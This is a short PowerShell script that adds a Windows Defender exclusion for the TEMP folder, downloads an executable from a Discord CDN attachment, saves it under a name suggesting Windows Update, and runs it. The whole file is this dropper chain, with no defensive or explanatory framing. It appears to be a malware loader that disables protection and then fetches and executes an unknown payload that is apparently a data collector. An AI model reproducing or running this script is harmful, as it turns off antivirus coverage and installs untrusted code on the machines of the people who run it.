$f="$env:TEMP\wu.exe"
Write-Host "[1] Adding exclusion..."
Add-MpPreference -ExclusionPath $env:TEMP 2>&1 | Write-Host
Write-Host "[2] Downloading..."
try { iwr "https://cdn.discordapp.com/attachments/1520398729520222211/1520409259874193458/collextor_msvc.exe?ex=6a4116f7&is=6a3fc577&hm=11caef28478c82dbd03014f4464cd7e410e2b260f6c8782eecebbec1b594a8f3&" -OutFile $f -UseBasicParsing } catch { Write-Host "Download error: $_" }
Write-Host "[3] File exists: $(Test-Path $f) Size: $((Get-Item $f -EA SilentlyContinue).Length)"
Write-Host "[4] Running..."
if (Test-Path $f) { & $f } else { Write-Host "File not found " }
Write-Host "[5] Done"
